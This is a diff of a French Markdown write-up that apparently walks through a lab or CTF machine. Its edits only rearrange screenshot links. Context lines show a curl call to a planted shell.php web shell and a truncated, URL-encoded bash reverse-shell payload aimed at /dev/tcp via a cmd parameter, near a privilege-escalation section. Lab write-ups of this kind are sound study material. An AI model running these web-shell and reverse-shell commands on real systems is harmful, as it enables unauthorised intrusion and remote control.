@@ -109,7 +109,7 @@ Exécution de commandes :
 curl "http://192.168.188.214/shell.php?cmd=id"  
 ```
 
-![image21](https://github.com/user-attachments/assets/e3582859-8fa2-40bf-a03a-a15324c71a66)
+![image25](https://github.com/user-attachments/assets/776c46b5-38c4-449b-87dd-4eba64c88dbf)
 
 ## 5. Élévation de Privilèges
 
@@ -167,6 +167,7 @@ curl "http://192.168.188.214:8080/?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/
 
 ![image5](https://github.com/user-attachments/assets/ffaa58c5-ad24-4938-a740-ecf05c40652d)
 ![image14](https://github.com/user-attachments/assets/daae84d5-5a6a-48da-8ac9-dfd8ecf71877)
+![image21](https://github.com/user-attachments/assets/e3582859-8fa2-40bf-a03a-a15324c71a66)
 ![image19](https://github.com/user-attachments/assets/0e5dabf4-ff0a-48e1-852a-9b4a625d256f)
 
 
